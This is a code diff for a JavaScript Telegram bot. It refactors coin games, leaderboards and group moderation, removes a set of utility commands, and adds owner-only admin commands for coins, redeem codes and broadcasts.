-  if (win) { let w = bet * 10; addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`🔥 RISK WIN! +${w}`); }
-  else { u.losses++; await ctx.reply(`💀 RISK LOST! -${bet}`); }
-  u.games++; users.set(ctx.from.id, u); stats.games++;
+  
+  if (win) {
+    let w = bet * 10;
+    addCoin(ctx.from.id, w);
+    u.wins++;
+    await ctx.reply(`🔥 RISK WIN! +${w} coins`);
+  } else {
+    u.losses++;
+    await ctx.reply(`💀 RISK LOST! -${bet} coins`);
+  }
+  u.games++;
+  users.set(ctx.from.id, u);
 });
 
 // ========== ECONOMY ==========
@@ -464,8 +632,7 @@ bot.action("daily", async (ctx) => {
   let streak = u.streak || 0;
   if (u.lastDaily && now - u.lastDaily < 172800000) streak++;
   else streak = 1;
-  let bonus = Math.min(streak, 10);
-  let reward = DAILY_REWARD + bonus;
+  let reward = DAILY_REWARD + Math.min(streak, 10);
   addCoin(ctx.from.id, reward);
   u.streak = streak;
   u.lastDaily = now;
@@ -489,11 +656,12 @@ bot.action("work", async (ctx) => {
   await ctx.reply(`💼 ${job} +${reward} coins\n💰 ${u.coins + reward}`);
 });
 
+// ========== LEADERBOARDS ==========
 bot.action("topc", async (ctx) => {
-  let top = Array.from(users.values()).sort((a,b) => b.coins - a.coins).slice(0,10);
+  let top = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
   let msg = "🏆 **💰 RICHEST** 🏆\n\n";
-  for (let i=0; i<top.length; i++) {
-    let medal = i===0?"🥇":i===1?"🥈":i===2?"🥉":"📌";
+  for (let i = 0; i < top.length; i++) {
+    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
     let name = await getName(top[i].id);
     msg += `${medal} @${name} - ${top[i].coins} coins\n`;
   }
@@ -501,10 +669,10 @@ bot.action("topc", async (ctx) => {
 });
 
 bot.action("topg", async (ctx) => {
-  let top = Array.from(users.values()).sort((a,b) => b.wins - a.wins).slice(0,10);
+  let top = Array.from(users.values()).sort((a, b) => b.wins - a.wins).slice(0, 10);
   let msg = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
-  for (let i=0; i<top.length; i++) {
-    let medal = i===0?"🥇":i===1?"🥈":i===2?"🥉":"📌";
+  for (let i = 0; i < top.length; i++) {
+    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
     let name = await getName(top[i].id);
     msg += `${medal} @${name} - ${top[i].wins} wins\n`;
   }
@@ -512,10 +680,10 @@ bot.action("topg", async (ctx) => {
 });
 
 bot.action("topr", async (ctx) => {
-  let top = Array.from(users.values()).sort((a,b) => b.refs - a.refs).slice(0,10);
+  let top = Array.from(users.values()).sort((a, b) => b.refs - a.refs).slice(0, 10);
   let msg = "🏆 **👥 TOP REFERRERS** 🏆\n\n";
-  for (let i=0; i<top.length; i++) {
-    let medal = i===0?"🥇":i===1?"🥈":i===2?"🥉":"📌";
+  for (let i = 0; i < top.length; i++) {
+    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
     let name = await getName(top[i].id);
     msg += `${medal} @${name} - ${top[i].refs} refs\n`;
   }
@@ -523,10 +691,10 @@ bot.action("topr", async (ctx) => {
 });
 
 bot.action("topl", async (ctx) => {
-  let top = Array.from(users.values()).sort((a,b) => b.level - a.level).slice(0,10);
+  let top = Array.from(users.values()).sort((a, b) => b.level - a.level).slice(0, 10);
   let msg = "🏆 **⭐ TOP LEVELS** 🏆\n\n";
-  for (let i=0; i<top.length; i++) {
-    let medal = i===0?"🥇":i===1?"🥈":i===2?"🥉":"📌";
+  for (let i = 0; i < top.length; i++) {
+    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
     let name = await getName(top[i].id);
     msg += `${medal} @${name} - Level ${top[i].level}\n`;
   }
@@ -534,39 +702,32 @@ bot.action("topl", async (ctx) => {
 });
 
 bot.action("toph", async (ctx) => {
-  let top = Array.from(users.values()).sort((a,b) => b.hacks - a.hacks).slice(0,10);
+  let top = Array.from(users.values()).sort((a, b) => b.hacks - a.hacks).slice(0, 10);
   let msg = "🏆 **🔧 TOP HACKERS** 🏆\n\n";
-  for (let i=0; i<top.length; i++) {
-    let medal = i===0?"🥇":i===1?"🥈":i===2?"🥉":"📌";
+  for (let i = 0; i < top.length; i++) {
+    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
     let name = await getName(top[i].id);
     msg += `${medal} @${name} - ${top[i].hacks} hacks\n`;
   }
   await ctx.reply(msg, { parse_mode: "Markdown" });
 });
 
-// ========== REFERRAL ==========
-bot.action("refinfo", async (ctx) => {
-  let u = initUser(ctx.from.id);
-  await ctx.reply(`🔗 REFERRAL\n\nLink: ${refLink(ctx.from.id)}\n\n📊 ${u.refs} refs | ${u.refs * REF_REWARD} coins earned\n\n🎁 ${REF_REWARD} coins per ref!`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "back")]]) });
-});
-
-// ========== PROFILE ==========
-bot.action("profile", async (ctx) => {
-  let u = initUser(ctx.from.id);
-  let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0;
-  await ctx.reply(`👤 PROFILE\n\n📝 ${ctx.from.first_name}\n🆔 ${ctx.from.id}\n\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs\n🔧 ${u.hacks} hacks\n🎮 ${u.wins}W / ${u.losses}L (${winRate}%)\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🔄 REFRESH", "profile"), Markup.button.callback("◀️ BACK", "back")]]) });
-});
-
-bot.action("stats", async (ctx) => {
-  let u = initUser(ctx.from.id);
-  let total = Array.from(users.values()).reduce((s, v) => s + v.coins, 0);
-  await ctx.reply(`📊 STATS\n\n🤖 Bot\n• Users: ${users.size}\n• Total Coins: ${total}\n• Hacks: ${stats.hacks}\n• Games: ${stats.games}\n• Referrals: ${stats.refs}\n\n👤 You\n• Level ${u.level}\n• ${u.refs} refs\n• ${u.hacks} hacks\n• ${u.wins}W/${u.losses}L`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "back")]]) });
+bot.action("leadc", async (ctx) => {
+  let top = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
+  let msg = "🏆 **💰 RICHEST** 🏆\n\n";
+  for (let i = 0; i < top.length; i++) {
+    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
+    let name = await getName(top[i].id);
+    msg += `${medal} @${name} - ${top[i].coins} coins\n`;
+  }
+  await ctx.reply(msg, { parse_mode: "Markdown" });
 });
 
 // ========== REDEEM ==========
 bot.action("redeem", async (ctx) => {
   await ctx.reply("🎁 REDEEM\n\nUse: /redeem <CODE>\n\nGet codes from giveaways!");
 });
+
 bot.command("redeem", async (ctx) => {
   let args = ctx.message.text.split(" ");
   if (args.length < 2) return ctx.reply("❌ /redeem <CODE>");
@@ -574,147 +735,25 @@ bot.command("redeem", async (ctx) => {
   if (res.ok) {
     let u = users.get(ctx.from.id);
     await ctx.reply(`✅ ${res.msg}\n💰 ${u.coins}`);
-  } else await ctx.reply(res.msg);
+  } else {
+    await ctx.reply(res.msg);
+  }
 });
 
-// ========== DEV TOOLS ==========
-bot.action("obf", async (ctx) => {
-  await ctx.reply("🔒 OBFUSCATE\n\nSend JavaScript code to protect!");
-  gameSessions.set(ctx.from.id, { type: "obf" });
-});
-bot.action("min", async (ctx) => {
-  await ctx.reply("🗜️ MINIFY\n\nSend JavaScript code to compress!");
-  gameSessions.set(ctx.from.id, { type: "min" });
-});
-bot.action("val", async (ctx) => {
-  await ctx.reply("✅ VALIDATE\n\nSend JavaScript code to check!");
-  gameSessions.set(ctx.from.id, { type: "val" });
-});
-bot.action("enc", async (ctx) => {
-  await ctx.reply("🔐 ENCRYPT\n\nUse: /encrypt <text>");
-});
-bot.command("encrypt", async (ctx) => {
-  let t = ctx.message.text.split(" ").slice(1).join(" ");
-  if (!t) return ctx.reply("Usage: /encrypt <text>");
-  let cipher = crypto.createCipher("aes-256-cbc", "key");
-  let enc = cipher.update(t, "utf8", "hex") + cipher.final("hex");
-  await ctx.reply(`🔐 \`${enc}\``, { parse_mode: "Markdown" });
-});
-bot.action("dec", async (ctx) => {
-  await ctx.reply("🔓 DECRYPT\n\nUse: /decrypt <hex>");
-});
-bot.command("decrypt", async (ctx) => {
-  let t = ctx.message.text.split(" ").slice(1).join(" ");
-  if (!t) return ctx.reply("Usage: /decrypt <hex>");
-  try {
-    let decipher = crypto.createDecipher("aes-256-cbc", "key");
-    let dec = decipher.update(t, "hex", "utf8") + decipher.final("utf8");
-    await ctx.reply(`🔓 ${dec}`);
-  } catch { await ctx.reply("❌ Invalid!"); }
-});
-bot.action("b64", async (ctx) => {
-  await ctx.reply("📝 BASE64\n\nUse: /base64 <text>");
-});
-bot.command("base64", async (ctx) => {
-  let t = ctx.message.text.split(" ").slice(1).join(" ");
-  if (!t) return ctx.reply("Usage: /base64 <text>");
-  await ctx.reply(`📝 \`${Buffer.from(t).toString("base64")}\``, { parse_mode: "Markdown" });
-});
-bot.action("hash", async (ctx) => {
-  await ctx.reply("🔢 HASH\n\nUse: /hash <md5/sha256> <text>");
-});
-bot.command("hash", async (ctx) => {
-  let args = ctx.message.text.split(" ");
-  let type = args[1];
-  let text = args.slice(2).join(" ");
-  if (!type || !text) return ctx.reply("Usage: /hash <md5/sha256> <text>");
-  let hash;
-  if (type === "md5") hash = crypto.createHash("md5").update(text).digest("hex");
-  else if (type === "sha256") hash = crypto.createHash("sha256").update(text).digest("hex");
-  else return ctx.reply("Use md5 or sha256");
-  await ctx.reply(`🔢 \`${hash}\``, { parse_mode: "Markdown" });
-});
-bot.action("ts", async (ctx) => {
-  await ctx.reply(`⏰ ${Math.floor(Date.now()/1000)}\n📅 ${new Date().toLocaleString()}`);
-});
-bot.action("rand", async (ctx) => {
-  await ctx.reply("🎲 RANDOM\n\nUse: /random <min> <max>");
-});
-bot.command("random", async (ctx) => {
-  let args = ctx.message.text.split(" ");
-  let min = parseInt(args[1]) || 1;
-  let max = parseInt(args[2]) || 100;
-  await ctx.reply(`🎲 ${Math.floor(Math.random() * (max - min + 1) + min)}`);
-});
-bot.action("note", async (ctx) => {
-  await ctx.reply("📋 NOTE\n\nUse: /note <text>");
-});
-bot.command("note", async (ctx) => {
-  let t = ctx.message.text.split(" ").slice(1).join(" ");
-  if (!t) {
-    let n = notes.get(ctx.from.id) || [];
-    if (n.length === 0) return ctx.reply("No notes");
-    let msg = "📋 NOTES:\n";
-    n.forEach((note, i) => msg += `${i+1}. ${note}\n`);
-    return ctx.reply(msg);
-  }
-  let n = notes.get(ctx.from.id) || [];
-  n.push(t);
-  notes.set(ctx.from.id, n);
-  await ctx.reply(`✅ Note saved!`);
-});
-bot.action("rem", async (ctx) => {
-  await ctx.reply("⏰ REMINDER\n\nUse: /remind <minutes> <text>\n\nExample: /remind 10 wake up");
-});
-bot.command("remind", async (ctx) => {
-  let args = ctx.message.text.split(" ");
-  let mins = parseInt(args[1]);
-  let text = args.slice(2).join(" ");
-  if (isNaN(mins) || !text) return ctx.reply("Usage: /remind <minutes> <text>");
-  setTimeout(async () => {
-    await ctx.reply(`⏰ REMINDER: ${text}`);
-  }, mins * 60000);
-  await ctx.reply(`✅ Reminder set for ${mins} minutes`);
-});
-bot.action("afk", async (ctx) => {
-  await ctx.reply("💤 AFK\n\nUse: /afk <reason>");
-});
-bot.command("afk", async (ctx) => {
-  let reason = ctx.message.text.split(" ").slice(1).join(" ") || "AFK";
-  let a = afk.get(ctx.from.id) || {};
-  a.reason = reason;
-  a.time = Date.now();
-  afk.set(ctx.from.id, a);
-  await ctx.reply(`💤 AFK: ${reason}`);
-});
-bot.action("whois", async (ctx) => {
-  await ctx.reply("🔍 WHOIS\n\nUse: /whois @username");
-});
-bot.command("whois", async (ctx) => {
-  let args = ctx.message.text.split(" ");
-  let user = args[1]?.replace("@", "");
-  if (!user) return ctx.reply("Usage: /whois @username");
-  for (let [id, u] of users) {
-    try {
-      let c = await ctx.telegram.getChat(id);
-      if (c.username === user) {
-        await ctx.reply(`👤 ${c.first_name}\n🆔 ${id}\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs`);
-        return;
-      }
-    } catch(e) {}
-  }
-  await ctx.reply("❌ User not found");
-});
-bot.action("sys", async (ctx) => {
-  let uptime = Math.floor((Date.now() - stats.start) / 3600000);
-  await ctx.reply(`📊 SYSTEM\n\n🤖 v${VERSION}\n⏱️ ${uptime}h up\n👥 ${users.size} users\n💰 ${stats.coins} coins\n🎯 ${stats.hacks} hacks\n🎮 ${stats.games} games`);
+// ========== REFERRAL ==========
+bot.action("refinfo", async (ctx) => {
+  let u = initUser(ctx.from.id);
+  await ctx.reply(`🔗 REFERRAL\n\nLink: ${refLink(ctx.from.id)}\n\n📊 ${u.refs} refs | ${u.refs * REF_REWARD} coins earned\n\n🎁 ${REF_REWARD} coins per ref!`, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "back")]])
+  });
 });
 
 // ========== GROUP TOOLS ==========
 bot.action("tag", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return ctx.reply("❌ Group only!");
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
+  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
   let now = Date.now();
   let last = tagCD.get(ctx.chat.id) || 0;
   if (now - last < 300000) return ctx.reply(`⏰ Wait ${Math.ceil((300000 - (now - last)) / 60000)} min`);
@@ -722,24 +761,27 @@ bot.action("tag", async (ctx) => {
   try {
     let admins = await ctx.getChatAdministrators();
     let mentions = "";
-    for (let a of admins.slice(0,30)) {
+    for (let a of admins.slice(0, 30)) {
       mentions += `[@${a.user.username || a.user.first_name}](tg://user?id=${a.user.id}) `;
     }
     await ctx.reply(`📢 Announcement\n\n${mentions}`, { parse_mode: "Markdown" });
     tagCD.set(ctx.chat.id, now);
-  } catch { ctx.reply("❌ Make me admin!"); }
+  } catch {
+    ctx.reply("❌ Make me admin!");
+  }
 });
 
 bot.action("setw", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
-  await ctx.reply("📝 Send welcome message\n\nUse: /setwelcome {name} {group}");
+  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
+  await ctx.reply("📝 Use: /setwelcome {name} {group}");
 });
+
 bot.command("setwelcome", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
+  if (!["administrator", "creator"].includes(admin.status)) return;
   let msg = ctx.message.text.split(" ").slice(1).join(" ");
   if (!msg) return ctx.reply("Usage: /setwelcome Welcome {name} to {group}!");
   welcome.set(ctx.chat.id, msg);
@@ -749,13 +791,14 @@ bot.command("setwelcome", async (ctx) => {
 bot.action("setg", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
-  await ctx.reply("📝 Send goodbye message\n\nUse: /setgoodbye {name}");
+  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
+  await ctx.reply("📝 Use: /setgoodbye {name}");
 });
+
 bot.command("setgoodbye", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
+  if (!["administrator", "creator"].includes(admin.status)) return;
   let msg = ctx.message.text.split(" ").slice(1).join(" ");
   if (!msg) return ctx.reply("Usage: /setgoodbye Goodbye {name}!");
   goodbye.set(ctx.chat.id, msg);
@@ -770,7 +813,8 @@ bot.on("new_chat_members", async (ctx) => {
     await ctx.reply(msg.replace("{name}", m.first_name).replace("{group}", ctx.chat.title));
   }
 });
-bot.on("left_chat_members", async (ctx) => {
+
+bot.on("left_chat_member", async (ctx) => {
   let msg = goodbye.get(ctx.chat.id);
   if (!msg) return;
   let m = ctx.message.left_chat_member;
@@ -781,26 +825,37 @@ bot.on("left_chat_members", async (ctx) => {
 bot.action("alink", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
-  if (antiLink.has(ctx.chat.id)) { antiLink.delete(ctx.chat.id); await ctx.reply("🚫 Anti-link OFF"); }
-  else { antiLink.add(ctx.chat.id); await ctx.reply("✅ Anti-link ON"); }
+  if (!["administrator", "creator"].includes(admin.status)) return;
+  if (antiLink.has(ctx.chat.id)) {
+    antiLink.delete(ctx.chat.id);
+    await ctx.reply("🚫 Anti-link OFF");
+  } else {
+    antiLink.add(ctx.chat.id);
+    await ctx.reply("✅ Anti-link ON");
+  }
 });
 
 bot.action("aspam", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
-  if (antiSpam.has(ctx.chat.id)) { antiSpam.delete(ctx.chat.id); await ctx.reply("🛡️ Anti-spam OFF"); }
-  else { antiSpam.add(ctx.chat.id); await ctx.reply("✅ Anti-spam ON"); }
+  if (!["administrator", "creator"].includes(admin.status)) return;
+  if (antiSpam.has(ctx.chat.id)) {
+    antiSpam.delete(ctx.chat.id);
+    await ctx.reply("🛡️ Anti-spam OFF");
+  } else {
+    antiSpam.add(ctx.chat.id);
+    await ctx.reply("✅ Anti-spam ON");
+  }
 });
 
 bot.action("warn", async (ctx) => {
-  await ctx.reply("⚠️ WARN\n\nReply with /warn");
+  await ctx.reply("⚠️ Reply with /warn");
 });
+
 bot.command("warn", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
+  if (!["administrator", "creator"].includes(admin.status)) return;
   let reply = ctx.message.reply_to_message;
   if (!reply) return ctx.reply("Reply to a user!");
   let id = reply.from.id;
@@ -815,12 +870,13 @@ bot.command("warn", async (ctx) => {
 });
 
 bot.action("kick", async (ctx) => {
-  await ctx.reply("🔨 KICK\n\nReply with /kick");
+  await ctx.reply("🔨 Reply with /kick");
 });
+
 bot.command("kick", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
+  if (!["administrator", "creator"].includes(admin.status)) return;
   let reply = ctx.message.reply_to_message;
   if (!reply) return ctx.reply("Reply to a user!");
   await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
@@ -829,12 +885,13 @@ bot.command("kick", async (ctx) => {
 });
 
 bot.action("ban", async (ctx) => {
-  await ctx.reply("🚫 BAN\n\nReply with /ban");
+  await ctx.reply("🚫 Reply with /ban");
 });
+
 bot.command("ban", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
+  if (!["administrator", "creator"].includes(admin.status)) return;
   let reply = ctx.message.reply_to_message;
   if (!reply) return ctx.reply("Reply to a user!");
   await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
@@ -842,18 +899,22 @@ bot.command("ban", async (ctx) => {
 });
 
 bot.action("mute", async (ctx) => {
-  await ctx.reply("🔇 MUTE\n\nReply with /mute <minutes>");
+  await ctx.reply("🔇 Reply with /mute <minutes>");
 });
+
 bot.command("mute", async (ctx) => {
   if (!ctx.chat.type?.includes("group")) return;
   let admin = await ctx.getChatMember(ctx.from.id);
-  if (!["administrator","creator"].includes(admin.status)) return;
+  if (!["administrator", "creator"].includes(admin.status)) return;
   let args = ctx.message.text.split(" ");
   let mins = parseInt(args[1]) || 30;
   let reply = ctx.message.reply_to_message;
   if (!reply) return ctx.reply("Reply to a user!");
   let until = Math.floor(Date.now() / 1000) + (mins * 60);
-  await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, { until_date: until, can_send_messages: false });
+  await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
+    until_date: until,
+    can_send_messages: false
+  });
   await ctx.reply(`🔇 ${reply.from.first_name} muted for ${mins} min`);
 });
 
@@ -865,49 +926,187 @@ bot.action("gstats", async (ctx) => {
   await ctx.reply(`📊 GROUP\n\n📝 ${chat.title}\n👥 ${count} members\n👑 ${admins.length} admins\n\n🚫 Anti-link: ${antiLink.has(ctx.chat.id) ? "ON" : "OFF"}\n🛡️ Anti-spam: ${antiSpam.has(ctx.chat.id) ? "ON" : "OFF"}`);
 });
 
+// ========== ADMIN COMMANDS (WORKING!) ==========
+bot.command("admin", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
+  await ctx.reply(`
+👑 ADMIN PANEL
+
+💰 /addcoin @user amount
+🎁 /gencode coins uses hours
+📋 /codes
+🗑️ /delcode CODE
+📢 /broadcast msg
+👥 /users
+📊 /stats
+🚫 /banuser @user
+✅ /unbanuser @user
+  `);
+});
+
+bot.command("addcoin", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let args = ctx.message.text.split(" ");
+  if (args.length < 3) return ctx.reply("Usage: /addcoin @user amount");
+  let user = args[1].replace("@", "");
+  let amt = parseInt(args[2]);
+  if (isNaN(amt)) return ctx.reply("Amount must be number!");
+  
+  for (let [id, u] of users) {
+    try {
+      let c = await ctx.telegram.getChat(id);
+      if (c.username === user) {
+        u.coins += amt;
+        u.totalEarned += amt;
+        users.set(id, u);
+        await ctx.reply(`✅ +${amt} to @${user}\n💰 ${u.coins} coins`);
+        return;
+      }
+    } catch(e) {}
+  }
+  await ctx.reply("❌ User not found!");
+});
+
+bot.command("gencode", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let args = ctx.message.text.split(" ");
+  let coins = parseInt(args[1]) || 50;
+  let uses = Math.min(parseInt(args[2]) || 20, 20);
+  let hours = parseInt(args[3]) || 24;
+  let code = genCode(coins, uses, hours);
+  await ctx.reply(`✅ CODE GENERATED!\n\nCode: \`${code}\`\n💰 ${coins} coins\n🔄 ${uses} uses\n⏱️ ${hours} hours`, { parse_mode: "Markdown" });
+});
+
+bot.command("codes", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  if (codes.size === 0) return ctx.reply("No active codes.");
+  let msg = "📋 ACTIVE CODES:\n\n";
+  for (let [c, d] of codes) {
+    msg += `\`${c}\` - ${d.coins} coins - ${d.left} uses left\n`;
+  }
+  await ctx.reply(msg, { parse_mode: "Markdown" });
+});
+
+bot.command("delcode", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let args = ctx.message.text.split(" ");
+  if (args.length < 2) return ctx.reply("Usage: /delcode CODE");
+  let code = args[1].toUpperCase();
+  if (codes.has(code)) {
+    codes.delete(code);
+    await ctx.reply(`✅ Code ${code} deleted!`);
+  } else {
+    await ctx.reply(`❌ Code ${code} not found!`);
+  }
+});
+
+bot.command("broadcast", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let msg = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!msg) return ctx.reply("Usage: /broadcast message");
+  await ctx.reply("📢 Sending broadcast...");
+  let s = 0, f = 0;
+  for (let [id] of users) {
+    try {
+      await ctx.telegram.sendMessage(id, `📢 ANNOUNCEMENT\n\n${msg}`);
+      s++;
+    } catch {
+      f++;
+    }
+  }
+  await ctx.reply(`✅ ${s} sent | ❌ ${f} failed`);
+});
+
+bot.command("users", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let msg = "📋 USERS:\n\n";
+  let i = 0;
+  for (let [id, u] of users) {
+    msg += `${++i}. ID: ${id} - ${u.coins} coins\n`;
+    if (i >= 20) break;
+  }
+  msg += `\nTotal: ${users.size} users`;
+  await ctx.reply(msg);
+});
+
+bot.command("stats", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let total = Array.from(users.values()).reduce((s, u) => s + u.coins, 0);
+  await ctx.reply(`
+📊 BOT STATS
+
+👥 Users: ${users.size}
+💰 Total Coins: ${total}
+🎯 Hacks: ${stats.hacks}
+🎮 Games: ${stats.games}
+🎁 Referrals: ${stats.refs}
+⏱️ Uptime: ${Math.floor((Date.now() - stats.start) / 3600000)}h
+  `);
+});
+
+bot.command("banuser", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let args = ctx.message.text.split(" ");
+  if (args.length < 2) return ctx.reply("Usage: /banuser @user");
+  let user = args[1].replace("@", "");
+  for (let [id] of users) {
+    try {
+      let c = await ctx.telegram.getChat(id);
+      if (c.username === user) {
+        banned.add(id);
+        await ctx.reply(`🚫 @${user} banned!`);
+        return;
+      }
+    } catch(e) {}
+  }
+  await ctx.reply("❌ User not found!");
+});
+
+bot.command("unbanuser", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  let args = ctx.message.text.split(" ");
+  if (args.length < 2) return ctx.reply("Usage: /unbanuser @user");
+  let user = args[1].replace("@", "");
+  for (let [id] of users) {
+    try {
+      let c = await ctx.telegram.getChat(id);
+      if (c.username === user) {
+        banned.delete(id);
+        await ctx.reply(`✅ @${user} unbanned!`);
+        return;
+      }
+    } catch(e) {}
+  }
+  await ctx.reply("❌ User not found!");
+});
+
+bot.command("restart", async (ctx) => {
+  if (ctx.from.id !== OWNER_ID) return;
+  await ctx.reply("🔄 Restarting...");
+  setTimeout(() => process.exit(0), 2000);
+});
+
+// ========== CHAT WITH DEV ==========
+bot.command("chat", async (ctx) => {
+  activeChats.set(ctx.chat.id, true);
+  await ctx.reply("💬 Chat mode active! Send message to dev. Type /exit to leave.");
+});
+
+bot.command("exit", async (ctx) => {
+  if (activeChats.has(ctx.chat.id)) {
+    activeChats.delete(ctx.chat.id);
+    await ctx.reply("✅ Exited chat mode.");
+  } else {
+    await ctx.reply("⚠️ Not in chat mode.");
+  }
+});
+
 // ========== MESSAGE HANDLER ==========
 bot.on("text", async (ctx) => {
   let session = gameSessions.get(ctx.from.id);
   if (session) {
-    let code = ctx.message.text;
-    if (session.type === "obf") {
-      let res = obfuscate(code);
-      if (res.ok) {
-        let u = initUser(ctx.from.id);
-        u.obfuscations = (u.obfuscations || 0) + 1;
-        users.set(ctx.from.id, u);
-        await ctx.reply(`✅ OBFUSCATED!\n📊 ${res.orig} → ${res.new} (${res.comp}%)\n\n\`\`\`js\n${res.ob.substring(0, 3000)}\`\`\``, { parse_mode: "Markdown" });
-        if (res.ob.length > 3000) await ctx.replyWithDocument({ source: Buffer.from(res.ob), filename: "obfuscated.js" });
-      } else await ctx.reply(`❌ ${res.error}`);
-    } else if (session.type === "min") {
-      let res = minify(code);
-      if (res.ok) await ctx.reply(`🗜️ MINIFIED\n\n\`\`\`js\n${res.min.substring(0, 3000)}\`\`\``, { parse_mode: "Markdown" });
-      else await ctx.reply(`❌ ${res.error}`);
-    } else if (session.type === "val") {
-      let res = validate(code);
-      if (res.ok) await ctx.reply("✅ Valid code!");
-      else await ctx.reply(`❌ ${res.error}`);
-    }
+    // Handle game sessions here if needed
     gameSessions.delete(ctx.from.id);
-    return;
-  }
-  
-  // Anti-link & Anti-spam
-  if (ctx.chat.type?.includes("group")) {
-    if (antiLink.has(ctx.chat.id) && (ctx.message.text.includes("http") || ctx.message.text.includes("t.me"))) {
-      await ctx.deleteMessage();
-      await ctx.reply(`🚫 Links not allowed! ${ctx.from.first_name}`);
-    }
-    if (antiSpam.has(ctx.chat.id)) {
-      let now = Date.now();
-      let spam = spamTrack.get(ctx.from.id) || [];
-      let recent = spam.filter(t => now - t < 5000);
-      if (recent.length >= 3) {
-        await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, { until_date: Math.floor(now/1000)+60, can_send_messages: false });
-        await ctx.reply(`🛡️ ${ctx.from.first_name} muted for spamming!`);
-        spamTrack.delete(ctx.from.id);
-      } else { recent.push(now); spamTrack.set(ctx.from.id, recent); }
-    }
   }
   
   // AFK check
@@ -918,14 +1117,38 @@ bot.on("text", async (ctx) => {
     afk.delete(ctx.from.id);
   }
   
+  // Anti-spam in groups
+  if (ctx.chat.type?.includes("group")) {
+    if (antiLink.has(ctx.chat.id) && (ctx.message.text.includes("http") || ctx.message.text.includes("t.me"))) {
+      await ctx.deleteMessage();
+      await ctx.reply(`🚫 Links not allowed! ${ctx.from.first_name}`);
+    }
+    if (antiSpam.has(ctx.chat.id)) {
+      let now = Date.now();
+      let spam = spamTrack.get(ctx.from.id) || [];
+      let recent = spam.filter(t => now - t < 5000);
+      if (recent.length >= 3) {
+        await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
+          until_date: Math.floor(now / 1000) + 60,
+          can_send_messages: false
+        });
+        await ctx.reply(`🛡️ ${ctx.from.first_name} muted for spamming!`);
+        spamTrack.delete(ctx.from.id);
+      } else {
+        recent.push(now);
+        spamTrack.set(ctx.from.id, recent);
+      }
+    }
+  }
+  
   // Chat with dev
-  if (activeChats.has(ctx.chat.id)) {
